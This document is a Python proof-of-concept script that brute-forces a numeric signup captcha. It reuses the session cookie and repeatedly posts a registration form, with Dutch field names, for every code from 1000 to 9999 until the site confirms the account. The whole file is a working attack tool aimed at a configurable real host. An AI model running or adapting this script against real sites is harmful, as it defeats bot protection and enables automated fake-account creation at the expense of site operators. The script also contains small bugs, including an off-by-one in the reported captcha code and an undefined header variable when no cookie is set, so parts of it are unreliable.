# -*- coding: utf-8 -*-

import sys

print(' ')
print('######################################')
print('#      BASIC CAPTCHA BYPASS POC      #')
print('######################################')
print(' ')
print('[info] checking requirements...');

try:
    import requests
except ImportError:
    print('[error] missing module: requests')
    sys.exit("halting ...\r\n")

print('[info] requirements satisfied. continuing ...')
print('[info] preparing information ...')

# configuration
protocolinput = 'http'
hostinput = 'example.com'
captchapath = '/path/to/captcha/script.php'
registerpath = '/path/to/signup/submission/script.php'
usernameinput = 'testaccount'
passwordinput = 'insertpasswordhere'
emailinput = 'insert@email.here'
newsletterinput = 0

sessionidname = 'PHPSESSID'

captchainput = 1000
releaseloop = False
success = False
sessionexists = False

# have new captcha code set
print('[info] requesting captcha ...')
try:
    captchar = requests.get(protocolinput+'://'+hostinput+captchapath)
except requests.exceptions.RequestException as e:
    print('[error] request failed')
    sys.exit("halting ...\r\n")
if captchar.status_code != 200:
    print('[error] returned status code does not satisify what was expected')
    sys.exit("halting ...\r\n")

# cookie extraction
try:
    cookies = captchar.headers['Set-Cookie']
    sessionc = cookies.split('=')

    pastcookie = ''
    for cookiedat in sessionc:
        if pastcookie == sessionidname:
            sessionid = cookiedat.split(';')[0]
            sessionexists = True
            break;
        else:
            pastcookie = cookiedat
    if pastcookie == sessionidname:
        # utilise the extracted session id
        print('[info] obtained session id')
        newcookie = sessionidname+'='+sessionid
        hdr = {'Content-Type':'application/x-www-form-urlencoded','Referer':protocolinput+'://'+hostinput+registerpath,'Cookie':newcookie}
    else:
        # failed to obtain session id -- fallback
        print('[warn] session id not found -- this may fail if captcha relies on it')
        hdr = {'Content-Type':'application/x-www-form-urlencoded','Referer':protocolinput+'://'+hostinput+registerpath}
except KeyError:
    print('[warn] session id not found -- this may fail if captcha relies on it')


print('[info] new captcha code set')


# bruteforce
print('[info] bruteforcing ...')
while releaseloop == False:
    try:
        registerr = requests.post(protocolinput+'://'+hostinput+registerpath, headers=hdr, data={'gebruikersnaam': usernameinput,'wachtwoord': passwordinput,'wachtwoordcontrole': passwordinput,'email': emailinput,'allow_mailing': newsletterinput,'norobot': captchainput,'aanmelden':'Register!'})
    except requests.exceptions.RequestException as e:
        print("\r\n[error] request failed")
        sys.exit("halting ...\r\n")
    if registerr.status_code != 200:
        print("\r\n[error] returned status code does not satisify what was expected")
        sys.exit("halting ...\r\n")
    elif registerr.text.find('Usernames may only contain letters and numbers') != -1:
         print("\r\n[error] username must be alphanumeric and have a character length of 3 - 15")
         sys.exit("halting ...\r\n")
    elif registerr.text.find('The email address you entered is incorrect!') != -1:
         print("\r\n[error] email is invalid (bad format)")
         sys.exit("halting ...\r\n")
    elif registerr.text.find('That email is already taken by someone!') != -1:
         print("\r\n[error] email in use")
         sys.exit("halting ...\r\n")
    elif registerr.text.find('Please enter a password that is the same as in the retype password field') != -1:
         print("\r\n[error] password empty")
         sys.exit("halting ...\r\n")
    elif registerr.text.find('You haven\'t retyped the image correctly!') != -1:
         sys.stdout.write("\rbruteforce attempt %i out of 9999 (this may take a while)" % captchainput)
         sys.stdout.flush()
         captchainput += 1
         if captchainput == 10000:
             releaseloop = True
    elif registerr.text.find('We are now going to send you a verification email.') != -1:
         releaseloop = True
         success = True

# results
print(' ')
print(' ')
if success == True:
    captchainput -= 1
    print('[info] success')
    print('username: '+usernameinput)
    print('password: '+passwordinput)
    print('email: '+emailinput)
    print('captcha code used: ' + str(captchainput))
else:
    print('[info] failed')

print(' ')
